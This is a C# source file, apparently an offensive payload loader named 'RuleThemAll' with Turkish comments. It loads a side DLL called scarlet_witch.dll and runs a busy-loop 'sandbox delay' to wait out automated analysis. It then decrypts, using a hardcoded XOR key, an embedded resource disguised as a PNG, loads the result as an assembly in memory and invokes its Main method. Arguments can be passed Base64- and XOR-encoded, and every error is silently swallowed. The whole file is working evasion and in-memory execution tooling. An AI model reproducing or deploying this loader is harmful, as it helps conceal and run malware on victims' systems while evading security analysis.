using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Text; // Added for Encoding

namespace RuleThemAll
{
    public class DllLoader
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        private static byte[] xorKey = new byte[] { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48 };

        private static void SandboxDelay(int intensity)
        {
            // Intensity: 1-10 arası, 10 en yoğun
            int iterations = intensity * 2000; 
            int nestedLevel = intensity * 10; 
            
            for (int i = 0; i < iterations; i++)
            {
                int mod = i % 4;
                switch (mod)
                {
                    case 0:
                        // Basit matematik işlemleri
                        for (int j = 0; j < nestedLevel; j++)
                        {
                            for (int k = 0; k < 10; k++) // Ekstra nested loop
                            {
                                double result = Math.Sqrt(i * j + k) + Math.Pow(i, 2) + Math.Sin(j) + Math.Cos(k);
                                if (result > 1000) result = result % 1000;
                            }
                        }
                        break;
                        
                    case 1:
                        // Daha karmaşık matematik
                        for (int j = 0; j < nestedLevel; j++)
                        {
                            for (int k = 0; k < nestedLevel / 2; k++)
                            {
                                for (int l = 0; l < 5; l++) // Ekstra nested loop
                                {
                                    double result = Math.Log(i + 1) * Math.Cos(j) + Math.Exp(k / 10.0) + Math.Tan(l);
                                    if (result > 1000) result = result % 1000;
                                }
                            }
                        }
                        break;
                        
                    case 2:
                        // String işlemleri
                        for (int j = 0; j < nestedLevel; j++)
                        {
                            for (int k = 0; k < 10; k++) // Ekstra nested loop
                            {
                                string temp = string.Format("{0}_{1}_{2}_{3}", i, j, i * j, k);
                                if (temp.Length > 50) temp = temp.Substring(0, 50);
                                temp = temp.Replace("_", "").ToUpper();
                            }
                        }
                        break;
                        
                    case 3:
                        // Array işlemleri
                        for (int j = 0; j < nestedLevel; j++)
                        {
                            for (int k = 0; k < 5; k++) // Ekstra nested loop
                            {
                                byte[] buffer = new byte[j % 100 + 1];
                                for (int l = 0; l < buffer.Length; l++)
                                {
                                    buffer[l] = (byte)((i + j + k + l) % 256);
                                }
                                // Array'i sırala (ekstra işlem)
                                Array.Sort(buffer);
                            }
                        }
                        break;
                }
            }
            
            Console.WriteLine("Good to go!");
        }

        public static void LoadScarletWitch(string[] args)
        {
            try
            {
                // Mevcut dizini al
                string currentDirectory = Directory.GetCurrentDirectory();
                string dllPath = Path.Combine(currentDirectory, "scarlet_witch.dll");
                
                if (!File.Exists(dllPath))
                {
                    return;
                }

                // DLL'i yükle
                IntPtr hModule = LoadLibrary(dllPath);
                if (hModule == IntPtr.Zero)
                {
                    return;
                }
                
                // Encrypted binary'yi çalıştır
                RunEncryptedBinary(args);
            }
            catch
            {
                // Hata durumunda hiçbir şey yapma
            }
        }

        private static void RunEncryptedBinary(string[] args)
        {
            try
            {
                string parameters = "";
                
                // --param parametresi kontrolü
                if (args.Length > 0 && args[0] == "--param")
                {
                    if (args.Length < 2)
                    {
                        return;
                    }
                    
                    // Şifreli parametreyi al (henüz decrypt etme)
                    string encryptedParam = args[1];
                }
                else
                {
                    // Normal parametre girişi
                    Console.Write("params: ");
                    parameters = Console.ReadLine();
                }
                
                // Sandbox delay çalıştır (intensity: 10)
                SandboxDelay(10);
                
                // Şifreli parametre varsa şimdi decrypt et
                if (args.Length > 0 && args[0] == "--param")
                {
                    string encryptedParam = args[1];
                    
                    try
                    {
                        // Base64'ten çevir
                        byte[] encryptedParamBytes = Convert.FromBase64String(encryptedParam);
                        
                        // XOR ile decrypt et
                        byte[] decryptedParamBytes = DecryptBytes(encryptedParamBytes);
                        
                        // String'e çevir
                        parameters = Encoding.UTF8.GetString(decryptedParamBytes);
                    }
                    catch
                    {
                        return;
                    }
                }
                
                // Parametreleri ekrana yazdır
                Console.WriteLine(string.Format("Running with params: {0}", parameters));
                
                // Resource'dan encrypted binary'yi oku
                byte[] encryptedBytes = GetResourceBytes("RuleThemAll.encrypted.png");
                if (encryptedBytes == null || encryptedBytes.Length == 0)
                {
                    return;
                }
                
                // XOR ile decrypt et
                byte[] decryptedBytes = DecryptBytes(encryptedBytes);
                
                // Assembly olarak yükle
                Assembly assembly = Assembly.Load(decryptedBytes);
                
                // Main metodunu bul ve çalıştır
                Type[] types = assembly.GetTypes();
                foreach (Type type in types)
                {
                    var mainMethod = type.GetMethod("Main", BindingFlags.Public | BindingFlags.Static);
                    if (mainMethod != null)
                    {
                        // Parametreleri string array'e çevir
                        string[] binaryArgs = parameters.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                        
                        // Main metodunu çağır
                        mainMethod.Invoke(null, new object[] { binaryArgs });
                        return;
                    }
                }
            }
            catch
            {
                // Hata durumunda hiçbir şey yapma
            }
        }

        private static byte[] GetResourceBytes(string resourceName)
        {
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (stream == null) return null;
                    
                    byte[] buffer = new byte[stream.Length];
                    stream.Read(buffer, 0, buffer.Length);
                    return buffer;
                }
            }
            catch
            {
                return null;
            }
        }

        private static byte[] DecryptBytes(byte[] encryptedBytes)
        {
            byte[] decryptedBytes = new byte[encryptedBytes.Length];
            for (int i = 0; i < encryptedBytes.Length; i++)
            {
                decryptedBytes[i] = (byte)(encryptedBytes[i] ^ xorKey[i % xorKey.Length]);
            }
            return decryptedBytes;
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            DllLoader.LoadScarletWitch(args);
        }
    }
}